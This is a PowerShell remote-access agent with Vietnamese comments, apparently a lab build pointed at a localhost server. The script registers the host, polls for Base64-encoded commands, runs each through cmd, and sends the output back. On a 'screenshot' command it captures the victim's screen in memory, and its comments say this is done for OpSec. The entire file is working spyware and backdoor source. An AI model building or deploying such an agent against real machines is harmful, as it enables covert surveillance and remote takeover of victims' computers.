# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3

# Nạp các thư viện .NET cần thiết để xử lý đồ họa và chụp ảnh
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        $task = Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
        return $task
    } catch { return $null }
}

function Send-Result ($output_str) {
    try {
        # Mã hóa kết quả sang Base64 trước khi gửi
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output_str)
        $encoded = [System.Convert]::ToBase64String($bytes)
        
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$encoded}
    } catch {}
}

# Hàm thực hiện chụp màn hình
function Capture-Screen {
    try {
        # Lấy kích thước màn hình chính
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        
        # Tạo đối tượng bitmap với kích thước tương ứng
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        
        # Sao chép hình ảnh từ màn hình vào bitmap
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        # Lưu hình ảnh vào luồng bộ nhớ (MemoryStream) thay vì ghi ra file đĩa
        # Điều này giúp tránh việc tạo file rác trên máy nạn nhân (OpSec)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        
        # Chuyển đổi dữ liệu ảnh sang chuỗi Base64
        $base64_img = [Convert]::ToBase64String($ms.ToArray())
        
        # Dọn dẹp tài nguyên bộ nhớ
        $graphics.Dispose()
        $bmp.Dispose()
        $ms.Dispose()
        
        # Trả về chuỗi định dạng đặc biệt để Server nhận diện
        return "[IMAGE] $base64_img"
    }
    catch {
        return "Error capturing screen: $_"
    }
}

# --- MAIN LOOP ---

Write-Host "[*] Starting Agent (Spy Mode)..."
$agent_id = Register-Agent

if (-not $agent_id) { Write-Host "[-] Failed."; Exit }

Write-Host "[+] Registered ID: $agent_id"

while ($true) {
    $encoded_task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($encoded_task)) {
        try {
            # Giải mã lệnh Base64 từ Server
            $bytes = [System.Convert]::FromBase64String($encoded_task)
            $cmd = [System.Text.Encoding]::UTF8.GetString($bytes)
            
            Write-Host "[*] Executing: $cmd"
            
            # Phân loại lệnh để xử lý
            if ($cmd -eq "screenshot") {
                # Gọi hàm chụp màn hình
                $result = Capture-Screen
            }
            else {
                # Nếu không phải lệnh đặc biệt, chạy như lệnh CMD thông thường
                $result = cmd /c $cmd 2>&1 | Out-String
            }

        } catch {
            $result = "Error: $_"
        }

        Send-Result -output_str $result
    }
    
    Start-Sleep -Seconds $sleep_time
}